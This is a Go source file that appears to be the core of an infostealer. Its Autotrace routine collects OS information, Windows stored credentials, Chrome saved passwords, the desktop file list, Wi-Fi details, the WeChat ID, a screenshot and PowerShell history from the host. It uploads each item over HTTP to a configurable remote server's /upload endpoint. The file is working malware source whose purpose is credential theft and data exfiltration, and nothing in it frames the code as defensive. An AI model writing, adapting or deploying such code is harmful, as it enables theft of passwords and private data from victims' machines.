package work

import (
	"fmt"
	"github.com/phil-fly/generate/core/postback"
	"github.com/phil-fly/generate/pool/Desktop"
	"github.com/phil-fly/generate/pool/Wifi"
	"github.com/phil-fly/generate/pool/chromePwd"
	"github.com/phil-fly/generate/pool/osinfo"
	"github.com/phil-fly/generate/pool/powershellHistory"
	"github.com/phil-fly/generate/pool/screenshot"
	"github.com/phil-fly/generate/pool/wechat"
	"github.com/phil-fly/generate/pool/wincreds"
	"log"
	"sync"
)

type Autotrace struct {
	remoteAddr string
	remotePort string
	reportUrl  string
	rid        string
}

func (self *Autotrace) setupRemoteURL() {
	self.reportUrl = "http://" + self.remoteAddr + ":" + self.remotePort + "/upload"
}

func (self *Autotrace) SetupRemoteAddr(remoteAddr string) {
	self.remoteAddr = remoteAddr
}

func (self *Autotrace) SetupRemotePort(remotePort string) {
	self.remotePort = remotePort
}

func (self *Autotrace) SetRid(rid string) {
	self.rid = rid
}

func (self *Autotrace) Work() {
	var wg sync.WaitGroup
	self.setupRemoteURL()

	guid,err := osinfo.AuniqueIdentifier()
	if guid == "" {
		fmt.Println(err)
		guid = "123456"
	}

	wg.Add(1)
	go func() {
		osInfo := osinfo.GetOSInformation()
		postback2 := &postback.HttpPostback{}
		postback2.SetTargetUrl(self.reportUrl)
		postback2.SetRid(self.rid)
		postback2.SetFileName("OsInfo")
		postback2.SetGuid(guid)
		postback2.Content = osInfo
		postback2.PostContent()
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		Wincreds, err := wincreds.GetWincred()
		if err == nil {
			postback2 := &postback.HttpPostback{}
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetRid(self.rid)
			postback2.SetFileName("Wincreds")
			postback2.SetGuid(guid)
			postback2.Content = Wincreds
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		chromePwdInfo, err := chromePwd.GetChromePwd()
		if err == nil {
			postback2 := &postback.HttpPostback{}
			postback2.SetGuid(guid)
			postback2.SetRid(self.rid)
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("ChromePwd")
			postback2.Content = []byte(chromePwdInfo)
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		desktopInfo := Desktop.GetDesktopFilelist()
		if desktopInfo != "" {
			postback2 := &postback.HttpPostback{}
			postback2.SetGuid(guid)
			postback2.SetRid(self.rid)
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("Desktop")
			postback2.Content = []byte(desktopInfo)
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		wifi := &Wifi.WifiCounter{}
		Personal, _ := getPersonal()
		wifi.SetShellPath(Personal)

		wifiInfo, err := wifi.GetWifiInfo()
		if err == nil {
			postback2 := &postback.HttpPostback{}
			postback2.SetGuid(guid)
			postback2.SetRid(self.rid)
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("wifiInfo")
			postback2.Content = wifiInfo
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		Wechat := &wechat.WechatCounter{}
		Wechat.SetResourcePath()
		WechatId := Wechat.GetWxID()
		Wechat.Wxid2Qrcode(WechatId)
		log.Print("WechatId:", WechatId)
		if WechatId != "" {
			postback2 := &postback.HttpPostback{}
			postback2.SetGuid(guid)
			postback2.SetRid(self.rid)
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("WechatId")
			postback2.Content = []byte(WechatId)
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		ScreenShotContent := screenshot.ScreenShot()
		if ScreenShotContent != nil {
			postback2 := &postback.HttpPostback{}
			postback2.SetGuid(guid)
			postback2.SetRid(self.rid)
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("ScreenShot")
			postback2.Content = ScreenShotContent
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		PowershellHistory := powershellHistory.GetPowershellHistory()
		if PowershellHistory != "" {
			postback2 := &postback.HttpPostback{}
			postback2.SetGuid(guid)
			postback2.SetRid(self.rid)
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("PowershellHistory")
			postback2.Content = []byte(PowershellHistory)
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Wait()

}
